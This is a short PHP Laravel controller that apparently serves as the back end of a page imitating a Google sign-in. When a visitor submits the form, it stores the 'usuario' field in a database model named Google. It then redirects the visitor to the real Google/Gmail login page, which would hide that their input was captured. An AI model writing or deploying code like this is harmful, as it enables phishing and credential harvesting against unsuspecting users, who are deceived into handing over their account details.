<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Google;

class GoogleController extends Controller
{
    public function create()
    {   
        return view('user.projects.google');
    }

    public function store(Request $request)
    {     
        $google = new Google();
        $google->usuario = $request->usuario;
        $google->save();
        return redirect('https://accounts.google.com/v3/signin/identifier?dsh=S906865848%3A1688657963386755&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AeDOFXjjDrhchSecRmZR1wLEsnZa0cXRPZ0gelfsuFCS8YPWt9_UJe7bF1tR_A55zImj7mGcgt2EUQ&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin');
    }

}
